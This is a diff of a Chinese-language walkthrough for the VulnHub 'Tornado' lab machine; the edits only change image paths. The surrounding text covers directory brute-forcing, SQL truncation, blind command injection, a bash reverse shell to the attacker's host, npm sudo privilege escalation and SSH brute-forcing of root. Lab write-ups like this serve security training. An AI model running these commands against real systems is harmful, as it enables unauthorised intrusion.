@@ -12,19 +12,19 @@
 
 若想要模拟真实环境，可以使用`nmap`
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\1.jpg)
+![](./Tornado-pic/1.jpg)
 
 # 信息收集
 
 ## 使用nmap扫描端口
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\2.jpg)
+![](./Tornado-pic/2.jpg)
 
 ## 网站信息探测
 
 访问80端口默认界面，发现是`apachee2`的默认界面，查看页面源代码也未发现内容
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\3.jpg)
+![](./Tornado-pic/3.jpg)
 
 尝试进行目录爆破
 
@@ -34,11 +34,11 @@
 gobuster dir -u http://192.168.10.11 -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,md -d -b 404,403
 ```
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\4.jpg)
+![](./Tornado-pic/4.jpg)
 
 发现一个路径`bluesky`，其他路径无可用，访问这个路径，发现是一个前端页面，不知道这种有没有和后端交互
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\5.jpg)
+![](./Tornado-pic/5.jpg)
 
 哇，这个界面真的很像现在大部分的网站，都是前后端分离的，不过这里的靶场不确定是否也是，所以对这个路径再进行一次扫描，可以看到还是有后端的语言`php`
 
@@ -46,11 +46,11 @@ gobuster dir -u http://192.168.10.11 -w /usr/share/wordlists/dirb/big.txt -x php
 gobuster dir -u http://192.168.10.11/bluesky -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,md
 ```
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\6.jpg)
+![](./Tornado-pic/6.jpg)
 
 或者借助浏览器插件`wappalyzer`也是可以发现编程语言的，这里若是发现后，就可以再使用目录爆破了
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\7.jpg)
+![](./Tornado-pic/7.jpg)
 
 访问上面扫描出的路径，通过上面也可以看到，可用的路径两个，一个`login.php`一个`signup.php`
 
@@ -60,25 +60,25 @@ gobuster dir -u http://192.168.10.11/bluesky -w /usr/share/wordlists/dirb/big.tx
 
 尝试输入一些弱密码、万能密码等操作，无法登录成功
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\8.jpg)
+![](./Tornado-pic/8.jpg)
 
 再访问`signup.php`，发现输入后，会直接提示注册成功信息
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\9.jpg)
+![](./Tornado-pic/9.jpg)
 
 以注册的信息进行访问`login.php`，并输入注册的信息进行登录
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\10.jpg)
+![](./Tornado-pic/10.jpg)
 
 在点击`portfolio`时，出现下面字符，说是`LFI`漏洞被修复了，但是不要忘记再测试
 
 其实这里点击功能点后，都未发现其他的利用，不过这里是`php`，所以测试是否有隐藏传参支持本地文件包含等，也就是进行爆破
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\11.jpg)
+![](./Tornado-pic/11.jpg)
 
 这里先查看每个功能点的页面源代码，在`portfolio`这里的页面源代码中，出现敏感目录信息
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\12.jpg)
+![](./Tornado-pic/12.jpg)
 
 这里假设不知道这个路径，对每个`php`文件进行路径测试，可以使用`ffuf`或`wfuzz`
 
@@ -86,7 +86,7 @@ gobuster dir -u http://192.168.10.11/bluesky -w /usr/share/wordlists/dirb/big.tx
 
 以火狐浏览器为例，打开开发者工具，可按`f12`进入
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\13.jpg)
+![](./Tornado-pic/13.jpg)
 
 或者利用工具`curl`
 
@@ -99,7 +99,7 @@ curl -X POST -d "uname=admin&upass=admin&btn=Login" http://192.168.10.11/bluesky
 
 查看`c.txt`即可发现`cookie`的名称以及值
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\14.jpg)
+![](./Tornado-pic/14.jpg)
 
 这里获取到`cookie`了，那么为什么确定`cookie`才可以呢，这里以`ffuf`为例，查看返回
 
@@ -108,7 +108,7 @@ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://192.168.10.11/bluesky/por
 #这是未设置爆破时的，并且未给予`cookie`
 ```
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\15.jpg)
+![](./Tornado-pic/15.jpg)
 
 上面的返回与目录爆破时一样，都是要`302`跳转的。
 
@@ -118,7 +118,7 @@ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://192.168.10.11/bluesky/por
 ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://192.168.10.11/bluesky/port.php -H "Cookie:PHPSESSID=kmpfqldt8iqc6ps0cfklotvglv"
 ```
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\16.jpg)
+![](./Tornado-pic/16.jpg)
 
 可以看到，指定`cookie`后，就可以直接访问了，所以这也是以`cookie`做身份验证的
 
@@ -173,11 +173,11 @@ http://192.168.10.11/bluesky/~tornado/imp.txt
 
 然后使用`ffuf`测试哪些有返回
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\17.jpg)
+![](./Tornado-pic/17.jpg)
 
 发现`url`中`http://192.168.10.11/~tornado/imp.txt`有返回，访问查看，发现全是邮箱地址
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\18.jpg)
+![](./Tornado-pic/18.jpg)
 
 之前在进行登录的时候，用户名处就是邮箱，测试这些用户名是否存在
 
@@ -197,11 +197,11 @@ sales@tornado
 
 使用`burp`抓取注册时的数据包，然后进行爆破
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\19.jpg)
+![](./Tornado-pic/19.jpg)
 
 攻击成功后进行查看，因为这里使用的是`burp`社区版，所以不能直接进行搜索结果，不过可以在设置中配置匹配，这里用户已注册会返回`User already registered`，以这个进行匹配，就可以清晰的看清了
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\20.jpg)
+![](./Tornado-pic/20.jpg)
 
 这里去网站看了一下，这个13是指长度，不过这里长度限制是在表单输入，和我通过抓包修改有什么关系，我已经不受表单控制了，😄
 
@@ -215,7 +215,7 @@ hr@tornado
 
 不过前面既然注册了，使用`burp`再验证一下，奇怪的点出现了，前面`manager`注册成功的，这里确登录不了
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\21.jpg)
+![](./Tornado-pic/21.jpg)
 
 # 分析为sql截断
 
@@ -235,15 +235,15 @@ jacob@tornado a
 hr@tornado    a
 ```
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\22.jpg)
+![](./Tornado-pic/22.jpg)
 
 之后直接登录`admin@tornado`，以及注册的密码，发现直接登录成功，但是查看这个功能点，还是不行
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\23.jpg)
+![](./Tornado-pic/23.jpg)
 
 再换一个注册`jacob@tornado a`，然后以`jacob@tornado`登录，好嘛，这里可以看到了
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\24.jpg)
+![](./Tornado-pic/24.jpg)
 
 发现这里输入什么就会返回什么，这不就是很好的`xss`吗，但是这里要`xss`还有什么用吗，都已经登录了，尝试试试输入一些命令，看其能否执行
 
@@ -253,7 +253,7 @@ hr@tornado    a
 
 我刚开始直接输入`ping 127.0.0.1`，因为是`linux`界面，所以一直在加载，那么，大概就清楚了。然后我把靶机重启了，然后重新验证，只发送5个包，`ping -c 127.0.0.1`，发现真的有变化，确定是可以执行命令，只是不把回显返回
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\25.jpg)
+![](./Tornado-pic/25.jpg)
 
 尝试进行`shell`反弹，先在`kali`中使用`nc`开启监听9999端口，然后输入下面命令，并执行
 
@@ -261,7 +261,7 @@ hr@tornado    a
 /bin/bash -c 'bash -i >& /dev/tcp/192.168.10.2/9999 0>&1'
 ```
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\26.jpg)
+![](./Tornado-pic/26.jpg)
 
 # 提权
 
@@ -273,11 +273,11 @@ hr@tornado    a
 find / -perm -4000 -print 2>/dev/null
 ```
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\27.jpg)
+![](./Tornado-pic/27.jpg)
 
 对于不知道`npm`的`sudo`提权，可以查看网站`gtfobins.github.io`中的帮助
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\28.jpg)
+![](./Tornado-pic/28.jpg)
 
 ```shell
 TF=$(mktemp -d)
@@ -286,7 +286,7 @@ chmod 777 tmp.Veh2PZ0bMR
 sudo -u catchme npm -C $TF --unsafe-perm i
 ```
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\29.jpg)
+![](./Tornado-pic/29.jpg)
 
 使用`dpkg`查看`python`版本，然后使用`python`获取交互式界面
 
@@ -295,13 +295,13 @@ dpkg -l | grep python
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\30.jpg)
+![](./Tornado-pic/30.jpg)
 
 ## 提权至root用户
 
 查看这个用户的家目录
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\31.jpg)
+![](./Tornado-pic/31.jpg)
 
 把代码中已经加密的那一串尝试进行分析，因为执行过这个脚本，发现不知道输入什么字符加密了。
 
@@ -347,17 +347,17 @@ for key in string.printable:
 
 然后执行这个脚本，把结果重定向到一个文件中
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\32.jpg)
+![](./Tornado-pic/32.jpg)
 
 其实数据不多，查看一下，就发现一个引人`idkrootpassword`
 
 把结果进行一个`ssh`爆破，针对`root`，因为已知的两个用户都用过了
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\33.jpg)
+![](./Tornado-pic/33.jpg)
 
 查看最终文件
 
-![](D:\stu\vulnhub\IA靶场\Tornado-pic\34.jpg)
+![](./Tornado-pic/34.jpg)
 
 
 
